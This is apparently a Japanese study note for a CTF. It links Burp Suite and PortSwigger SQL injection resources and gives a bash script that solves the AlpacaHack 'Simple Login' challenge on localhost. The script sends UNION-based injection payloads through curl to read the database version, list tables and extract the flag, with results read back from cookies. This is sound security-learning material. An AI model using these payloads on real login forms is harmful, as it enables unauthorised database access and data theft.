# Burp Suite
# Windows
- Burp Suite Community Edition Windows (x64) をダウンロード
- https://www.leon-tec.co.jp/blog/10174/

# SQL injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/sql-injection/union-attacks

# shell sciprt
**sql_injection.sh**
```bash
#!/bin/bash
# (Simple Login)[https://alpacahack.com/ctfs/round-2/challenges/simple-login]
URL="http://127.0.0.1:3000/login"
# simple-login には 64 文字以内の制限がある
QUERIES=(
'SELECT @@version,NULL'
'SELECT table_name,NULL FROM information_schema.tables'
'SELECT value,NULL FROM flag'
)
for q in "${QUERIES[@]}"; do
    echo "[+] $q"
    curl -i -X POST \
        --data-urlencode "username=\\" \
        --data-urlencode "password= UNION ${q}-- " \
        $URL 2>/dev/null |
        awk '/^Set-Cookie:/{print $2}' | cut -d'=' -f 2 | sed 's/;//'
    echo
done
```
